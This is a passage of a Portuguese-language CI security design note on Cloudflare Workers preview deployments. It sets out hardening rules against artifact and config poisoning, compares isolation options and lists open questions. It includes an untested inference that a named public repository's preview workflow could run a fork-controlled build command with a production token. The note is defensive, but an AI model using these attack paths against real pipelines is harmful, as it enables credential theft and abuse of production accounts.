- usar valores do artifact (número do PR, nome do branch) em `${{ }}`, `GITHUB_ENV` ou `GITHUB_OUTPUT`. O `cloudflare-os` cita: "the pattern workers-sdk deleted, because the privileged half read the PR number out of an artifact the unprivileged half had named" ([preview.yml L151-153](https://github.com/cloudflare/cloudflare-os/blob/82b0c09f995175ed728d47e04298ca26c741fc5c/.github/workflows/preview.yml#L151-L153));
- envenenamento de cache;
- runner reaproveitado.

### 4.3 Regras que fecham os caminhos (inferência)

1. O `deploy` roda `wrangler preview` **com `--config` apontando para um arquivo da `main`** e cwd = checkout da `main`.
2. O artifact é extraído **fora do cwd**, em `$RUNNER_TEMP/pr/…`. O config da `main` aponta `main` e `assets.directory` para esse caminho. Também vale apagar qualquer `.env*`, `wrangler.*`, `.wrangler/`, `node_modules/` e `package.json` do diretório extraído (defesa em profundidade).
3. As dependências do `deploy` vêm do lockfile da `main`, com `--ignore-scripts`. Usar `pnpm exec wrangler` a partir do checkout da `main`. Se usar o `wrangler-action`, fixar `wranglerVersion` e `workingDirectory` na `main`.
4. Definir explicitamente no env do step `CLOUDFLARE_API_BASE_URL=https://api.cloudflare.com/client/v4`. Como o env do processo prevalece sobre o `.env` ([`dot-env.ts` L72](https://github.com/cloudflare/workers-sdk/blob/0d826c6aa3ae5d3db1c539c78ddca0ac42df5001/packages/wrangler/src/config/dot-env.ts#L72)), isso neutraliza esse vetor mesmo se a regra 2 falhar.
5. O número do PR e o nome do preview vêm do **payload do evento**, nunca do artifact.
6. Se o `build` gerar `_headers` e `_redirects`, aceitá-los afeta só o preview. Para garantir `noindex` e evitar redirecionamentos enganosos, sobrescrevê-los como faz o `nimbus` (opcional).

**Sobre o `withastro/docs` (inferência, não testada):**
- o `deploy-preview.yml` baixa na raiz do workspace (sem checkout) o artifact com `dist/`, `worker.js` e **`wrangler.jsonc` produzido pelo build do PR**, que roda também para forks;
- em seguida roda `wrangler preview` com o token de produção;
- pelo código acima, um `build.command` nesse `wrangler.jsonc` rodaria em shell com o token no ambiente;
- serve de exemplo concreto de por que a regra 1 é indispensável.

### 4.4 Um Worker de preview separado reduz o risco?

**Inferência:**
- **O que ele protegeria:** só o cenário "o token de preview vazou mesmo com as regras acima". Com um token restrito a `app-preview`, o atacante não conseguiria fazer `wrangler deploy` do `app`.
- **Por que, hoje, provavelmente não protege nem isso:** os endpoints de Preview parecem aceitar só grupos account-wide (§1.5). O token que funciona para criar previews editaria o `app` do mesmo jeito.
- **O que ele não muda:**
  - o runtime: os bindings vêm do config da `main` nos dois casos;
  - a cota Free, que é por conta;
  - o vazamento de secrets da base config, que existem nos dois casos.
- **Custos:**
  - um segundo Worker, que exige Admin para ser criado ([Workers roles](https://developers.cloudflare.com/workers/authorization/workers/));
  - um segundo bloco de config, que precisa ficar em sincronia;
  - previews num hostname diferente do Worker de produção.

**Comparação:**
- **Mesmo Worker, mesmo token, com as regras da §4.3:** o risco residual é um bug no nosso próprio pipeline ou um comprometimento do wrangler, de uma action ou do runner. Nesses casos, o token de produção vaza.
- **Worker separado na mesma conta:** o risco residual é praticamente o mesmo, se o ponto 3 se confirmar.
- **Conta Cloudflare separada para previews:** é a **única** opção que isola de fato o token, os recursos e a cota. Custa:
  - uma segunda conta Free;
  - os previews ficam no `workers.dev` dessa conta, sem o custom domain da produção;
  - recursos de preview duplicados (Hyperdrive/Neon de preview etc.).

---

## 5. Runtime: o preview (código do PR) alcança dados de produção?

- **Token da API em runtime: não.** **Fonte diz:** "With bindings, you never have to add secret keys or tokens to your Worker… The underlying secret is never exposed to your Worker's code" ([Bindings](https://developers.cloudflare.com/workers/runtime-apis/bindings/), 2026-10-12). O runtime vê apenas `env`, ou seja, vars, secrets e bindings do Preview. **Inferência:** o token só existiria em runtime se nós o colocássemos como secret. Não colocar.
- **Bindings compartilhados:** sim, se o bloco `previews` apontar para o recurso de produção. "Two Previews bound to the same account-level resource ID or name share its data" ([Resources](https://developers.cloudflare.com/workers/previews/resources/)). Fazer deploy com binding não exige permissão no recurso: "You do not need separate permissions on the bound resources to deploy the Worker" ([Workers roles](https://developers.cloudflare.com/workers/authorization/workers/)). **Inferência:** quem controla o config controla o acesso, e no nosso desenho é a `main`. Também vale manter a regra aceita na rodada 1: "PR que muda bindings pula o preview".
- **Service bindings:** "Service bindings from a Preview call the bound Worker's production deployment" ([Resources › Limitations](https://developers.cloudflare.com/workers/previews/resources/#service-bindings)). O `pdx-tools` usa isso de propósito: o bloco `previews` liga `PREVIEW_SAVES` ao próprio Worker de produção, entrypoint `PreviewSaves` ([wrangler.toml](https://github.com/pdx-tools/pdx-tools/blob/228ec702184bf60164daa6bb1e803c8a3ec9ff13/src/app/wrangler.toml)). **Inferência:** não declarar service bindings em `previews`, a menos que o entrypoint seja só leitura de dados públicos.
- **`ctx.exports` e Durable Objects:** resolvem para o namespace do Preview ([Resources › Durable Objects](https://developers.cloudflare.com/workers/previews/resources/#durable-objects); [Blog](https://blog.cloudflare.com/worker-previews/)).
- **Internet pública:** o preview pode chamar a API pública da produção como qualquer cliente, e mandar para fora tudo o que tiver no `env`. Por isso o branch Neon e os secrets de preview devem ser tratados como expostos ([19 §3.3](19-pr-ci-security.md)).
- **Cota da conta:** 100 mil requests por dia no Free, por conta (§1.4). Se requests a Previews contarem, o que não está documentado, um preview malicioso pode gastar a cota e derrubar a produção com o erro 1027 até a meia-noite UTC. Só uma conta separada isola isso. O modo "fail open" da rota contorna o Worker, mas não serve para uma SPA com API.

---

## Lacunas e incertezas

1. **Qual papel autoriza `POST …/previews`.** Não está documentado. O OpenAPI não declara grupos e a issue #15797 segue aberta. **Testar:** token per-Worker Editor contra o legado Workers Scripts Edit (§1.5).
2. **Se requests a Previews contam na cota diária do Free.** Não documentado.
3. **Precedência entre a base config do dashboard e o bloco `previews` local.** Não documentada (já registrado em [19 §3.3](19-pr-ci-security.md)). Usar `--ignore-base-config` no CI elimina a dúvida, ao custo de não receber os secrets de base.
4. **Se a conta do `cloudflare-os` é separada da produção.** Não ficou claro.
5. **Bugs de limpeza #15945 e #16170.** Podem deixar previews servindo depois do delete.
6. **O vetor `build.command` no `withastro/docs`.** É inferência do código do wrangler, não reproduzida.
